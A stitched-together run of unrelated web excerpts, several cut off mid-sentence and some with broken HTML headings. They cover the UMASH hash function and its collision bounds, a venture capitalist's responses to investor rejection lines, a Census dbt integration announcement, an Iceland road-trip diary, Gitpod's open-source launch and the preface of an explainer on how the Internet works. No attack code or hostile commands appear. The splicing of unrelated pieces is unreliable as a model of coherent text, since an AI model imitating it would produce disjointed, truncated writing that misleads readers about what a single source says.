<a href="https://github.com/backtrace-labs/umash">MIT-licensed UMASH hash function</a>
is a decently fast non-cryptographic hash function that guarantees
a worst-case bound on the probability of collision
<a href="https://en.wikipedia.org/wiki/Universal_hashing#Mathematical_guarantees">between any two inputs generated independently of the UMASH parameters</a>.</p><p>On the
<a href="https://en.wikichip.org/wiki/intel/xeon_platinum/8175m">2.5 GHz Intel 8175M</a>
servers that power <a href="https://backtrace.io/">Backtrace</a>’s hosted
offering, UMASH computes a 64-bit hash for short cached inputs of up
to 64 bytes in 9-22 ns, and for longer ones at up to 22 GB/s, while
guaranteeing that two distinct inputs of at most \(s\) bytes collide
with probability less than \(\lceil s / 2048 \rceil \cdot 2^{-56}\).
If that’s not good enough, we can also reuse most of the parameters to
compute two independent UMASH values. The resulting 128-bit
<a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint function</a>
offers a short-input latency of 9-26 ns, a peak throughput of 11.2
GB/s, and a collision probability of \(\lceil s / 2048 \rceil^2 \cdot
2^{-112}\) (better than \(2^{-70}\) for input size up to 7.5 GB).
These collision bounds hold for all inputs constructed without any
feedback about the randomly chosen UMASH parameters.</p><p>The latency on short cached inputs (9-22 ns for 64 bits, 9-26 ns for
128) is somewhat worse than the state of the art for non-cryptographic
hashes—
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> achieves
8-15 ns and <a href="http://fastcompression.blogspot.com/2019/03/presenting-xxh3.html">xxh3</a>
8-12 ns—but still in the same ballpark. It also
compares well with latency-optimised hash functions like
<a href="https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function#FNV-1a_hash">FNV-1a</a>
(5-86 ns) and
<a href="https://en.wikipedia.org/wiki/MurmurHash#MurmurHash2">MurmurHash64A</a>
(7-23 ns).</p><p>Similarly, UMASH’s peak throughput (22 GB/s) does not match
the current best hash throughput (37 GB/s with
<a href="https://github.com/Cyan4973/xxHash">xxh3</a>
and <a href="https://github.com/gamozolabs/falkhash">falkhash</a>, apparently
10% higher with <a href="https://github.com/cmuratori/meow_hash">Meow hash</a>),
but does comes within a factor of two; it’s actually higher than that of
some performance-optimised hashes, like
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> (16 GB/s) and
<a href="https://github.com/google/farmhash">farmhash32</a>
(19 GB/s). In fact, even the 128-bit fingerprint (11.2 GB/s) is
comparable to respectable options like
<a href="https://github.com/aappleby/smhasher/blob/master/src/MurmurHash2.cpp#L89">MurmurHash64A</a>
(5.8 GB/s) and
<a href="https://burtleburtle.net/bob/hash/spooky.html">SpookyHash</a> (11.6 GB/s).</p><p>What sets UMASH apart from these other non-cryptographic hash
functions is its proof of a collision probability bound. In the
absence of an adversary that adaptively constructs pathological inputs
as it infers more information about the randomly chosen parameters, we
know that two distinct inputs of \(s\) or fewer bytes will have the
same 64-bit hash with probability at most \(\lceil s / 2048 \rceil
\cdot 2^{-56},\) where the expectation is taken over the random
“key” parameters.</p><p>Only one non-cryptographic hash function in
<a href="https://github.com/rurban/smhasher">Reini Urban’s fork of SMHasher</a>
provides this sort of bound: <a href="https://github.com/lemire/clhash">CLHash</a>
<a href="https://arxiv.org/abs/1503.03465">guarantees a collision probability \(\approx 2^{-63}\)</a>
in the same
<a href="https://en.wikipedia.org/wiki/Universal_hashing#Mathematical_guarantees">universal hashing</a>
model as UMASH. While CLHash’s peak throughput (22 GB/s) is
equal to UMASH’s, its latency on short inputs is worse (23-25 ns
instead of 9-22ns). We will also see that its stronger collision
bound remains too weak for many practical applications. In order to
compute a <a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint</a>
with CLHash, one would have to combine multiple hashes, exactly like
we did for the 128-bit UMASH fingerprint.</p><p>Actual cryptographic hash functions provide stronger bounds in a much
more pessimistic model; however they’re also markedly slower than
non-cryptographic hashes. <a href="https://github.com/BLAKE3-team/BLAKE3">BLAKE3</a>
needs at least 66 ns to hash short inputs, and achieves a peak throughput
of 5.5 GB/s. Even the <a href="https://github.com/rust-lang/rust/issues/29754">reduced-round SipHash-1-3</a>
hashes short inputs in 18-40 ns and longer ones at a peak throughput
of 2.8 GB/s. That’s the price of their pessimistically adversarial
security model. Depending on the application, it can make sense to
consider a more restricted adversary that must prepare its dirty deed
before the hash function’s parameters are generated at random, and
still ask for provable bounds on the probability of collisions.
That’s the niche we’re targeting with UMASH.</p><p>Clearly, the industry is comfortable with no bound at all.
However, even in the absence of
<a href="https://www.131002.net/siphash/#at">seed-independent collisions</a>,
timing side-channels in a data structure implementation could
theoretically leak information about colliding inputs, and iterating
over a hash table’s entries to print its contents can divulge even more
bits. A sufficiently motivated adversary could use something like
that to learn more about the key and deploy an algorithmic denial of
service attack. For example, the linear structure of UMASH (and of
other polynomial hashes like CLHash) makes it easy to combine known
collisions to create exponentially more colliding inputs. There is no
universal answer; UMASH is simply another point in the solution space.</p><p>If reasonable performance coupled with an actual bound on collision
probability <em>for data that does not adaptively break the hash</em> sounds
useful to you,
<a href="https://github.com/backtrace-labs/umash">take a look at UMASH on GitHub</a>!</p><p>The <a href="#but-why">next section</a> will explain why we found it useful to
design another hash function. The rest of the post
<a href="#umash-high-level">sketches how UMASH works</a> and
<a href="#implementation-tricks">how it balances short-input latency and strength</a>,
before <a href="#usage">describing a few interesting usage patterns.</a></p><p><small>The latency and throughput results above were all measured on
the same unloaded 2.5 GHz Xeon 8175M. While we did not disable
frequency scaling (#cloud), the clock rate seemed stable at 3.1
GHz during our run.</small></p><h2 id="a-idbut-whyahow-did-we-even-get-here"><a id="but-why"></a>How did we even get here?</h2><p>Engineering is the discipline of satisficisation: crisply defined
problems with perfect solutions rarely exist in reality, so we must
resign ourselves to satisfying approximate constraint sets “well
enough.” However, there are times when all options are not only
imperfect, but downright sucky. That’s when one has to put on a
different hat, and question the problem itself: are our constraints
irremediably at odds, or are we looking at an under-explored
solution space?</p><p>In the former case, we simply have to want something else. In the
latter, it might make sense to spend time to really understand the
current set of options and hand-roll a specialised approach.</p><p>That’s the choice we faced when we started caching intermediate
results in
<a href="https://help.backtrace.io/en/articles/2428859-web-console-overview">Backtrace’s database</a>
and found a dearth of acceptable hash functions. Our in-memory
columnar database is a core component of the backend, and, like most
analytics databases, it tends to process streams of similar queries.
However, a naïve query cache would be ineffective: our more heavily
loaded servers handle a constant write load of more than 100 events
per second with dozens of indexed attributes (populated column values)
each. Moreover, queries invariably select a large number of data
points with a time windowing predicate that excludes old data… and
the endpoints of these time windows advance with each wall-clock
second. The queries evolve over time, and must usually consider newly
ingested data points.</p><p><a href="https://www.gsd.inesc-id.pt/~rodrigo/slider_middleware14.pdf">Bhatotia et al’s Slider</a>
show how we can specialise the idea of
<a href="http://adapton.org/">self-adjusting or incremental computation</a>
for repeated MapReduce-style queries over a sliding window.
The key idea is to split the data set at stable boundaries (e.g., on
date change boundaries rather than 24 hours from the beginning of the
current time window) in order to expose memoisation opportunities, and
to do so recursively to repair around point mutations to older data.</p><p>Caching fully aggregated partial results works well for static
queries, like scheduled reports… but the first step towards creating
a great report is interactive data exploration, and that’s an activity
we strive to support well, even when drilling down tens of millions of
rich data points. That’s why we want to also cache intermediate
results, in order to improve response times when tweaking a saved
report, or when crafting ad hoc queries to better understand how and
when an application fails.</p><p>We must go back to a
<a href="http://www.umut-acar.org/self-adjusting-computation">more general incremental computation strategy</a>:
rather than only splitting up inputs, we want to stably partition the
data dependency graph of each query, in order to identify shared
subcomponents whose results can be reused. This finer grained
strategy surfaces opportunities to “resynchronise” computations, to
recognize when different expressions end up generating a subset of
identical results, enabling reuse in later steps. For example, when
someone updates a query by adding a selection predicate that only
rejects a small fraction of the data, we can expect to reuse some of
the post-selection work executed for earlier incarnations of the
query, if we remember to key on the selected data points rather than
the predicates.</p><p>The complication here is that these intermediate results tend to be
large. Useful analytical queries start small (a reasonable query
coupled with cache/transaction invalidation metadata to stand in for
the full data set), grow larger as we select data points, arrange them
in groups, and materialise their attributes, and shrink again at the
end, as we summarise data and throw out less interesting groups.</p><p>When caching the latter shrinking steps, where resynchronised reuse
opportunities abound and can save a lot of CPU time, we often
find that storing a fully materialised representation of the cache key
would take up more space than the cached result.</p><p>A classic approach in this situation is to fingerprint cache keys with
a cryptographic hash function like
<a href="https://en.wikipedia.org/wiki/BLAKE_(hash_function)">BLAKE</a>
or <a href="https://en.wikipedia.org/wiki/SHA-3">SHA-3</a>, and store a
compact (128 or 256 bits) fingerprint instead of the cache key: the
probability of a collision is then so low that we might as well assume
any false positive will have been caused by a bug in the code or a
hardware failure. For example,
<a href="https://users.ece.cmu.edu/~omutlu/pub/memory-errors-at-facebook_dsn15.pdf#page=3">a study of memory errors at Facebook</a>
found that uncorrectable memory errors affect 0.03% of servers each
month. Assuming a generous clock rate of 5 GHz, this means each
clock cycle may be afflicted by such a memory error with probability
\(\approx 2.2\cdot 10^{-20} &gt; 2^{-66}.\) If we can guarantee that
distinct inputs collide with probability significantly less than
\(2^{-66}\), e.g., \(&lt; 2^{-70},\) any collision is far
more likely to have been caused by a bug in our code or by
hardware failure than by the fingerprinting algorithm itself.</p><p>Using cryptographic hashes is certainly safe enough, but requires a lot of
CPU time, and, more importantly, worsens latency on smaller keys (for
which caching may not be that …</p></div></article></div></div>

<p>Admittedly it’s a valid question — what if the 800 lb gorilla in your space does copy you? What is your edge? How will you win?</p>
<p>Here are a couple of answers that may help:</p>
<p>A. Large companies are so large, they aren’t able to prioritize or even care about your “small” opportunity relative to their huge company. In the case of Google specifically, it has actually been shown that building a Google product competitor can actually be a great opportunity.&nbsp; Many people would much prefer to pay for products so that they can get customer support when something goes wrong — a free Google product will never a customer’s calls or emails.</p>
<p>Companies like Mixpanel, Optimizely, Superhuman, and many more have built big businesses by going head-to-head with a free Google product by charging customers and providing a better experience.</p>
<p>So it’s actually&nbsp;<em>validation</em> of your market if Google is interested in your space.</p>
<p>B. Big companies, by definition, are no longer nimble.&nbsp; You, in contrast, are able to run circles around them.&nbsp; Can you prove that you’re nimble by shipping quickly?&nbsp; Can you show that customers love you more than Google?&nbsp; These are concrete things that you can point to in your conversations with VCs.</p>
<p><strong>2) We don’t invest in hardware (only to find out that they led a round for hardware) (<a href="https://twitter.com/PeterJColbert">@peterjcolbert</a>)</strong></p>
<p>This is an interesting one, because you see VCs deviate from their thesis sometimes.&nbsp; (Every VC does it – we’ve done it too.).&nbsp; VCs will often say they don’t invest in hardware.&nbsp; Or ad revenue based models.&nbsp; Or e-commerce.&nbsp; Or in some geography.&nbsp; And then you see a portfolio company on their website that is clearly in one of these categories.</p>
<p><em>You should just ask a VC about it directly.&nbsp;&nbsp;</em></p>
<p>The reason for this is usually along one of these lines:</p>
<p>A. They used to invest in that category but are now over-indexed. Or they invested in that category previously as an angel or with a past fund. I.e. they&nbsp;<em>used to make those investments but no longer do</em>.</p>
<p>This is important to understand, because if the reason the firm is passing is that they are waiting for some liquidity on existing positions in your space, there could potentially still be an opening for an investment later.&nbsp; This is rare, BUT possible – this has happened once to a company that I’ve backed before.</p>
<p>B. They are experimenting outside their thesis. E.g. They may not usually invest in South America, but they may make 1 investment to learn about the market. They may not invest in hardware, but may invest in 2 companies to learn about the space.</p>
<p>Unfortunately, if this is the case, you can try to hard to convince a VC to do more experimentation in that category, but because VCs have mandates — i.e. they have an agreement with their investors that they would focus on investing in certain categories / theses, they will likely not want to deviate *too* much from their thesis.&nbsp; VCs are judged by their investors on whether they end up investing based on the strategy that they claimed they would.</p>
<p>C. They had a special relationship with the founder.</p>
<p>There is nothing you can do about this.&nbsp; People back their friends all the time regardless of what they are building.</p>
<p>I think it’s easy to walk away fuming mad thinking that a firm is filled with hypocrites, but it’s worth just bringing up with a VC:&nbsp;“Hey you mentioned that you don’t do hardware, but I noticed on your website that you’ve invested in X.&nbsp; Am curious how that fits your thesis?” You may not like the response and it may not change anything, but on rare occasion it may open a door for you.</p>
<p><strong>3) I don’t think this can be a venture scale business. (<a href="https://twitter.com/kirbywinfield">@kirbywinfield</a>)</strong></p>
<p>I’m of two minds on this one.</p>
<p>A. There are a lot of companies who seek out venture funding who are actually NOT a good fit for VC investors.&nbsp; Entrepreneurs should be aware of the return profile that VCs are looking for.&nbsp; Loosely speaking, VCs are looking for a minimum of 100x return in the course of 5 years or so.&nbsp; This comes out to achieving roughly $100m runrate within the next 5 years.&nbsp; Is this what you want to do?</p>
<p>B. However, on the flip side, what ideas will be able to achieve $100m runrate in 5 years is tough to say. VCs often have preconceived notions above what can get to this level and what cannot — <em>and they are often wrong</em>. Companies that tend to get overlooked are in categories such as e-commerce, for example.&nbsp; Are you selling a widget that will likely max out at $5m in sales per year?&nbsp; Or are you the next Stitch Fix?</p>
<p>My advice here would be to first understand for yourself if you want to be growing a business that goes to $100m in annual revenue in 5 years (and the work / hiring that will be required to do so). And if so, what do you think that path looks like if everything goes well?&nbsp; How will you get to $2m runrate this year and then more than double your sales each year thereafter?</p>
<p>And if the answer is that you don’t want to run this type of business, there are other avenues of funding.&nbsp; Angel funding, crowdfunding, revenue-based financing are all good channels that are now rapidly growing.</p>
<p><strong>4) But how will you manage being a mom AND running a startup? (<a href="https://twitter.com/HustleFundVC">@hustlefundvc</a>)</strong></p>
<p>Ugh.&nbsp; Are we in the 21st century?&nbsp; Move on from any VC who asks this.&nbsp; It’s not worth it.</p>
<p><strong>5) We’d be interested when we see a bit more traction. (<a href="https://twitter.com/msuster">@msuster</a>)&nbsp;</strong></p>
<p>Ah, the classic ask for more traction.&nbsp; Basically, the VC doesn’t have conviction right now, but maybe, just maybe, more traction would give him/her the conviction to do your deal.&nbsp; The reality is that most investors can’t articulate what level of traction they would want to see in order to invest.&nbsp; Obviously, if you earn $100m in the next 2 months, everyone will be onboard, but what if you get to $100k / mo runrate in the next year — is that interesting?&nbsp; Well…it depends.&nbsp; And unless you are an asshole or a fraudster, VCs always want to preserve optionality to see you in a year and check on your business.</p>
<p>So, although this is a frustrating response, the right way to play this is to triage investors quickly.&nbsp; Put this VC in a “not interested” bucket. Continue to send him/your monthly investor updates, but you’re better off trying to find someone who has conviction today than trying to convince someone to get conviction — even with traction.&nbsp; You just need to meet a lot of investors and triage a lot of investors quickly in order to find the right investors to bring into your company.</p>
<p><strong>6) Maybe you should raise more and grow quicker. (<a href="https://twitter.com/JustinPUSHAS">@justinpushas</a>)</strong></p>
<p>This is just a stupid comment.&nbsp; If a VC really believes in your business, he/she will commit to your round, and will either help you fill your larger round or write a bigger check.&nbsp; But, investors who say things like this without any action are either just oblivious or not helpful, and should just move on from these investors. As we all know, founders who struggle to raise $250k are also going to have a tough time raising $2.5m.</p>
<p>That being said, I would recommend that every founder <a href="https://elizabethyin.com/2016/03/13/you-should-have-4-fundraising-plans/">develop multiple fundraising plans</a>.&nbsp; This will allow you to pitch a different amount of money to bigger or smaller investors with different milestones and goals that you would achieve with different investment sizes. And then if you do receive this question, you can point to a larger fundraising plan and mention that you have thought about a larger plan and are open to raising more money but are also not limited in growth if you cannot raise that amount now.</p>
<p><strong>7) Come back when you have a lead (<a href="https://twitter.com/stefanopep3">@stefanopep3</a>)</strong></p>
<p>The herd of sheep comment!&nbsp; A variation on this is, “I’m committed once you have a lead.” This is a positive way for a VC to say no for now, but if you have enough fundraising traction, then he/she wants to get his/her foot in the door.</p>
<p><span>It’s important to clarify what a VC means by this, though.&nbsp; Does this mean he/she is interested:&nbsp;</span></p>
<ul>
<li><span>When you have most of your round committed? </span></li>
<li><span>Once terms have been set?</span></li>
<li><span>If another investor is taking a board seat and is providing “serious responsibility ” for the investment.&nbsp; (i.e. no party rounds)?</span></li>
</ul>
<p><span>This is important to clarify, because VCs mean different things when they ask about a lead VC.&nbsp; </span></p>
<p><span>If it’s the former — come back when most of the round is committed — you can build your round in many different ways.&nbsp; You can bring together a party round of smaller investors without a lead on a convertible note or SAFE.&nbsp; It’s actually quite common these days for a smaller fund to set terms on a note or a SAFE and bring together a round that way.&nbsp;&nbsp;</span></p>
<p><span>And if a VC is just looking to evaluate terms, then you can create your own terms on a note or a SAFE and present those to the VC.&nbsp;</span></p>
<p>And lastly, if the VC is looking for a true “lead VC” to invest the majority of the round and take a board seat, etc, then this is a completely different ask from the prior two.</p>
<p><strong><span>8) Let me know how I can help!&nbsp; Founder asks for help. *crickets* (<a href="https://twitter.com/Quan">@quan</a>)</span></strong></p>
<p>When I started my VC career, I asked this question to a few entrepreneurs I met with.&nbsp; I genuinely wanted to be helpful.&nbsp; Then I quickly realized that there was literally nothing I could help with.&nbsp; Hah.&nbsp; Every founder just wanted investment dollars, and if I weren’t investing, I couldn’t even do introductions to other investors, because it would be a bad signal.</p>
<p><strong>9) Nothing. They ghost you. (<a href="https://twitter.com/ameetshah">@ameetshah</a>)</strong></p>
<p>*crickets*</p>
<p><strong>10) Contact us if you like but we prefer warm introductions. (<a href="https://twitter.com/cwlucas">@cwlucas</a>)</strong></p>
<p>I find this ironic — VCs prefer warm introductions, and YET, there are a lot of VC analysts who send outbound emails to startups completely cold asking to chat!</p>
<p>My recommendation here is to try to get a warm referral to a VC.&nbsp; Just in general, it’s always better …</p></div></div>

With our new native dbt support, you can take advantage of shared query logic across all your models, &nbsp;and create “last-mile” models that are automatically synced into apps like Salesforce, Marketo, etc. This is the first data modeling integration we’ve ever built in Census and we think it’s the first of its kind for dbt too.</p><p>We’ve <a href="https://blog.getcensus.com/meet-census/">mentioned</a> <a href="http://getdbt.com/">dbt</a> as an emerging piece of technology in the <a href="https://blog.getcensus.com/graduating-to-the-modern-data-stack-for-startups/">modern data stack</a>. For those of you who aren’t familiar, dbt is a tool that helps you write &amp; run SQL transforms in your data warehouse. The key benefit of using dbt is that your SQL is stored in version control, which means there’s a history of all changes. This makes it much easier for teams to collaborate. The other key feature of dbt is that you can create shared logic for your SQL code (e.g. you can build intermediate views on your data or you can write macros for repetitive parts of your queries). All of this makes it an ideal tool for the modern data stack where you can maintain all the code that cleans &amp; prepares your data for action.</p><blockquote>Census can now materialize select dbt models directly into your external tools like Salesforce, Marketo, Customer.io, etc.</blockquote><p>As of today in Census, you can connect to a dbt project stored on GitHub, select models whose output you’d like to make available for publishing, and take advantage of our sync engine to get the data into the hands of your business teams. Let’s walk through what this looks like in practice.</p><ol><li><strong>Connect to GitHub</strong>. When you go to the Models tab, you’ll be prompted with a choice to either store &amp; edit SQL directly in Census or connect to GitHub and select a repository where you keep your dbt data models. You don’t need to create a new project for Census – you can keep all your transform logic in one repository.</li><li><strong>Select models for Census</strong>. By default when you connect a new dbt project, Census will only look for models that have been tagged with the keyword <code>census</code>. This way you can decide which models or groups of models should be available for Census to sync into other applications (most of us don’t want to sync our internal staging transforms). You can configure this selector for your project (e.g. <code>path:/models/publish</code>).</li><li><strong>Sync models to destinations</strong>. The best part about our integration is that you don’t have to think about managing yet another materialization schedule. We automatically respect your existing setup, whether your dbt runner is in-house or in dbtCloud. The models you expose to Census are treated as ephemeral for our syncs so they can reference your other models without having to think about their materialization. <em>In other words, you can think of Census as responsible for materializing these models (incrementally) into your external tools like Salesforce, Customer.io, etc.</em></li></ol><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/R69F87BLyEg?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>A short demo of our native dbt integration</figcaption></figure><p>As you can see in this video, it's easy to connect existing dbt projects with Census &amp; to take advantage of our integration. If you would like to migrate your existing Census models to a dbt project, reach out to our team or your dedicated CSM.</p><p>PS: We plan to do a lot more with dbt in the months to come so stay tuned :-)</p>

			<p>We arrived in the early morning of a sunny June day.</p>
			<p>On June 14, 2016, I left the cozy, sleepy comfort of Orange County to embark on a journey. I had set my sights on my destination for a long time, having admired its natural beauty, its varied scenery, and its eccentric culture. As soon as I was able, I bought my tickets, booked my hotels, and looked toward the future eagerly – I was going to Iceland.</p>
			<p>When we arrived, the air was cool and crisp, a refreshing change from the hot and dry weather of Southern California. Though dreary from a red-eye flight, I could already feel the magic of the place. The landscape is unlike most places in the world: mostly untouched, ragged, and very volcanic. Fluorescent-green moss blankets fields of jagged volcanic rock, in a way that makes you feel like you're on another planet. But there are features that feel closer to home, like the Nordic charm of Reykjavík.</p>

			<p>We spent the first few days going to the music festival Secret Solstice 2016. The highlight of this was that we got to see Radiohead's first ever performance in Iceland, which was magical.</p>
			<p>The Hallgrímskirkja is a spectacular church perched atop the tallest point in Reykjavík. We took an elevator to the top to get a better view of our home for the next few days.</p>

			<p>Reykjavík is such an eccentric city. It feels somewhat like a Californian beachtown, but in an unmistakably Scandinavian kind of way. Unforgetable are the authentic, homely and modest architecture, the whimsical and thought-provoking street art, the delicious hot dogs, and the friendly people. After a few days of acclimating, though, we headed off to experience the untamed Icelandic wilderness.</p>
			<p>For the first stretch of the journey, we took what is known as the Golden Circle, a popular route that goes from Reykjavík to Þingvellir, Geysir, and Gullfoss, among other destinations.</p>
		</section>
		<section data-zoom-start="2">
			<h2>
				<span>Þingvellir</span>
				<span>The Continental Divide</span>
			</h2>
			<p>Þingvellir is a national park northeast of Reykjavík. Here, the North American and Eurasian tectonic plates are drifting apart, and the effect is palpable – in fact, you can stand right inbetween them. The air is calm and quiet, in contrast to the giant, craggy cliffs that sit on either side of you. We ventured a ways through the canyon, navigating boulders, foliage, and interesting clumps of moss. Sensing impending rain in the air, we decided to head to the next destination.</p>

		</section>
		<section data-zoom-start="3">
			<h2>
				<span>Geysir</span>
				<span>The Great Gush</span>
			</h2>
			<p>Geysir is a geyser located not far from Þingvellir. Geysir is so prominent that the word "geyser" itself is derived from it. Unfortunately, Geysir no longer erupts frequently, and is awakened only by the occasional earthquake. However, Geysir has a few siblings, namely Strokkur, that do like to erupt quite frequently. We eagerly awaited several eruptions from Strokkur, which occurred every 10 minutes or so.</p>
			<p>A bit chilly outside, we found comfort in the heat of the steam coming from the geothermal vents around the area. After retreating to the visitor center for a quick treat, we ventured off again.</p>

			<h2>
				<span>Gullfoss</span>
			</h2>
			<p>A short drive from Geysir landed us at Gullfoss, one of the most iconic waterfalls in Iceland. Gullfoss in particular is remarkable, as it is stepped – after taking a short dive, the water plunges into a deep crevice, hurling a ton of mist into the air. You can walk down a path towards a rocky outcropping that puts you only inches from the water. Gullfoss is so forceful that you can feel the earth tremble under your boots.</p>
			<p>After this adventure, we headed back to Reykjavík one last time before our trip around the country.</p>

				<span>Selfoss</span>
			</h2>
			<p>The next day, we drove through the small town of Selfoss on our way down the southern edge of Iceland. Though it shares its name with a waterfall in the north of Iceland, the town contains no waterfalls. After crossing over a bridge and meandering through the town, we came upon the facility where Skyr is produced. Skyr is a yogurt-like snack (technically a soft cheese) that is often mixed with fruit. It is sold all around Iceland, and like the hot dogs, we found ourselves craving some every time we stopped to refresh ourselves.</p>

				<span>Seljalandsfoss</span>
			</h2>
			<p>Seljalandsfoss is one of the most photogenic waterfalls in Iceland. What makes it unlike other waterfalls is that it pours over a small cave that you can walk into. From the cave, you can walk down to the shore behind the waterfall itself. Peering up, the water is falling from directly above you. It is truly a sight to behold.</p>

			<h2>
				<span>Skógafoss</span>
			</h2>
			<p>Skógafoss is another large waterfall located several kilometers from Seljalandsfoss. The force of water flowing down this waterfall is massive. It sprays a barrage of mist into the air at the bottom, preventing you from getting too close (unless you like cold showers). A trail extends up the right side of the waterfall, with a few outcroppings that you can climb on to get a better view. Climbing to the top gives you a sense of the tremendous amount of water falling down the waterfall.</p>
			<p>There is a surprising amount of wildlife at Skógafoss. Sheep and horses graze the hillsides, gulls drift through the air before perching in nests alongside the waterfall.</p>

				<span>Vík</span>
				<span>Black Sands</span>
			</h2>
			<p>At the southern tip of Iceland lies a small, cozy town by the name of Vík. Just west of Vík is a stretch of black sand and a small peninsula called Dyrhólaey. This is one of the most awe-inspiring places in Iceland. The Atlantic ocean batters the beach vigorously – huge waves crash, fierce winds blow, water wears away at the pitch-black volcanic rock. You can climb over some curiously-shaped basalt columns while gazing out at the ocean. In the distance stand two columns of black rock, Reynisfjara and Reynisdrangar, planted tenaciously in the ocean.</p>

				<span>Fjaðrárgljúfur</span>
			</h2>
			<p>After spending a night in Vík at a wonderful cabin, we set off east towards the next leg of the adventure.</p>
			<p>We stopped first at Fjaðrárgljúfur, a deep canyon in the southeast of Iceland. It is accessible by a gravel path that gave our poor rental quite a beating. A trail hugs the lip of the canyon for quite a long way. You can even travel the bed of the canyon by foot – the river that flows through it is fairly shallow. We caught a glimpse of a few travelers wading through the water, and another man with a fishing pole.</p>

			<p>We stopped next at one of the most unique locations in the world. Jökulsárlón is a lagoon at the edge of a flow from the Breiðamerkurjökull glacier. Icebergs break off of the glacier and float around in the lagoon. The air is incredibly cold and quiet, and the icebergs have a luminous blue tinge to them. Stunned by the sound of cracking ice, we witnessed an iceberg breaking in two, sending huge ripples along the smooth surface of the water.</p>

			<p>We began the the journey the next day by visiting Seyðisfjörður, a fjord in the eastern region of Iceland. We ascended a mountain pass covered in snow, and then descended through thick fog. After taking a pit stop to check out Gufufoss, we arrived in the town proper.</p>

			<h2>
				<span>Dettifoss</span>
			</h2>
			<p>After diverging from the main road down a gravel road, we reached a natural wonder. Dettifoss is the most powerful waterfall in Europe, fed by water from the Vatnajökull glacier. The water is a greyish-brown, filled with sediment that gives it a primal look. The waterfall can be viewed from either side of the river, though both sides are unique. The eastern side is rocky and jagged, whereas the western side is lush and mossy. There are no guardrails here – you can walk up right the the edge of the water. The sheer size of the drop and the volume of water flowing are breathtaking.</p>

The water is a spectacular aquamarine hue, almost pearlescent, reminiscent of the blue tinge of the icebergs in Jökulsárlón. We walked down to the shore of the river and hiked around.

August 26, 2020 | https://www.gitpod.io/blog/opensource/ | <a href="https://web.archive.org/web/*/https://www.gitpod.io/blog/opensource/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>As of today Gitpod is open source under the AGPL license at <a href="https://github.com/gitpod-io/gitpod" target="_blank" rel="nofollow noopener noreferrer">github.com/gitpod-io/gitpod</a>. This allows the community to participate in the development of Gitpod, provides more transparency and makes it even easier for developers to use and integrate Gitpod in their workflows.</p>
<p>For those of you who know us, this probably does not come as a big surprise. Working in open source is in our DNA and everything we’ve created over the past 10 years, including <a href="https://github.com/eclipse-theia/theia" target="_blank" rel="nofollow noopener noreferrer">Theia</a>, <a href="https://github.com/eclipse/xtext" target="_blank" rel="nofollow noopener noreferrer">Xtext</a>, <a href="https://github.com/eclipse/openvsx" target="_blank" rel="nofollow noopener noreferrer">Open VSX</a> and many other projects have been open source. In fact, Gitpod was our only closed-source project and it is a relief to change that going forward.</p>

<p>Contributing to Gitpod should be easy and accessible for everyone. All contributions are welcome, including pull requests, issues, documentation as well as updates and tweaks, blog posts, tutoials, and more. Please head over to <a href="https://github.com/gitpod-io/gitpod" target="_blank" rel="nofollow noopener noreferrer">Github</a> to find out about the various ways you can contribute and join our <a href="https://community.gitpod.io/" target="_blank" rel="nofollow noopener noreferrer">Gitpod Community</a>.</p>
<p>Over the past year, Gitpod has simplified contributions to many open source projects (see <a href="https://contribute.dev/" target="_blank" rel="nofollow noopener noreferrer">contribute.dev</a> for examples). Today, everyone in our team is excited to share our own streamlined development pipeline including Kubernetes preview deployments, an aggressively cached build system, our own slim and fast CI system and of course Gitpod, which continuously beams us into ready-to-code (and debug) dev environments. <a href="https://github.com/csweichel" target="_blank" rel="nofollow noopener noreferrer">Chris</a> gave a great talk about this setup earlier this year 👇</p>
<div> <p> <iframe title="" src="https://www.youtube.com/embed/dFMpXUsJcGM?rel=0" allowfullscreen=""></iframe> </p> </div>
<p>Naturally, we develop Gitpod in Gitpod. This allows the  whole team  to spin up fully initialized, remote dev environments on any branch at any time. </p>
<p>In line with the <a href="http://cloudscaling.com/blog/cloud-computing/the-history-of-pets-vs-cattle/?utm_source=thenewstack&amp;utm_medium=website&amp;utm_campaign=platform" target="_blank" rel="nofollow noopener noreferrer">pets vs. cattle</a> analogy of the cloud-native world, we treat dev environments as automated (yet customizable) resources you can spin up when you need them and close down (and forget about) when you are done with your task. Once you experience the peace of mind of automated, ephemeral dev environments you never want to go back.</p>
<p>Sven will run a webinar next week on Thursday, where we will showcase how we use Gitpod internally at Gitpod and how much it improves our workflow. Hope to see you there! </p>



<p>The <a href="https://www.gitpod.io/pricing/#" target="_blank" rel="nofollow noopener noreferrer">SaaS offering of gitpod.io</a> remains the easiest way to streamline your development workflows with continuously prebuilt dev environments. </p>
<p>In case you want to host Gitpod on your own infrastructure or private cloud, starting today, Gitpod Self-Hosted is free for unlimited users. Organizations using Gitpod Self-Hosted can purchase an enterprise license in order to get additional features like:</p>
<ul>
<li><a href="https://www.gitpod.io/features/#snapshot" target="_blank" rel="nofollow noopener noreferrer">Snapshots</a> (share a reproducible workspace with your team)</li>
<li><a href="https://www.gitpod.io/features/#share" target="_blank" rel="nofollow noopener noreferrer">Live Share</a> (invite others into your running workspace)</li>
<li><a href="https://www.gitpod.io/features/#prebuilt" target="_blank" rel="nofollow noopener noreferrer">Unlimited Prebuilds</a> (making ephemeral dev environments possible)</li>
<li>Admin Dashboard</li>
</ul>
<p>Offering a paid plan for enterprises makes it possible for us to keep working towards building a new category in developer tooling, which completes modern DevOps pipelines. In the future we will add additional functionality to both the open source code as well our paid offering.</p>

Preface
</summary>

  <p>I wrote this article to introduce the Internet to a non-technical audience.
In order to get everyone on board,
I first explain basic concepts, such as
<a href="#communication-protocol">communication protocols</a>,
<a href="#network-topologies">network topologies</a>,
and <a href="#signal-routing">signal routing</a>.
The section about <a href="#internet-layers">Internet layers</a> becomes increasingly technical
and peaks with a deep dive into <a href="#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>.
If the beginning is too elementary for you,
then just skip ahead to more interesting sections.</p>

  <p>Due to the nature of the topic,
this article contains a lot of acronyms.
